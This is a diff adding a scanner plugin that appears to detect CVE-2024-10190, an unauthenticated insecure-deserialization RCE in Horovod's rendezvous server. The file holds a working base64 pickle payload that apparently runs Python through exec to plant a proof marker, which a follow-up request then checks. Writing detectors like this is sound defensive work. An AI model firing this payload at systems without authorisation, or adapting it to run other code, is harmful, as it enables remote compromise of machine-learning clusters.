@@ -1,0 +1,96 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Horovod_CVE_2024_10190"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-10190"
+  }
+  severity: CRITICAL
+  title: "Horovod Insecure Deserialization Rendezvous Server RCE"
+  description: "An insecure deserialization vulnerability exists in Horovod versions up to and including 0.28.1 within the ElasticRendezvousHandler component. Unauthenticated attackers can send serialized cloudpickle payloads via HTTP PUT requests to the worker_addresses scope, leading to remote code execution."
+  recommendation: "At the time of this plugin's writing, 0.28.1 is the latest version, and the Github repository is archived. Due to that, the only simple solutions are to restrict network access to the rendezvous and coordination ports or stop using Horovod."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-10190"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_horovod_rendezvous"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 400
+      expect_any: {
+        conditions: [
+          { header: { name: "Server" } contains: "SimpleHTTP" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "probe_deserialization"
+  http_request: {
+    method: PUT
+    uri: "/worker_addresses/localhost:0"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/octet-stream"
+      }
+    ]
+    data: "gASVJAEAAAAAAABdlIwIYnVpbHRpbnOUjARleGVjlJOUWAEBAAAKaW1wb3J0IGluc3BlY3QKZiA9IGluc3BlY3QuY3VycmVudGZyYW1lKCkKd2hpbGUgZjoKICAgIGlmICJzZWxmIiBpbiBmLmZfbG9jYWxzIGFuZCBoYXNhdHRyKGYuZl9sb2NhbHNbInNlbGYiXSwgInNlcnZlciIpOgogICAgICAgIGYuZl9sb2NhbHNbInNlbGYiXS5zZXJ2ZXIuY2FjaGVbImN2ZV8yMDI0XzEwMTkwIl0gPSB7InByb29mIjogYiJDVkUtMjAyNC0xMDE5MF9SQ0VfQ09ORklSTUVEIn0KICAgICAgICBicmVhawogICAgZiA9IGYuZl9iYWNrCpSFlFKUhpQu"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "verify_deserialization_execution"
+  http_request: {
+    method: GET
+    uri: "/cve_2024_10190/proof"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "CVE-2024-10190_RCE_CONFIRMED" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_horovod_rendezvous",
+    "probe_deserialization",
+    "verify_deserialization_execution"
+  ]
+}
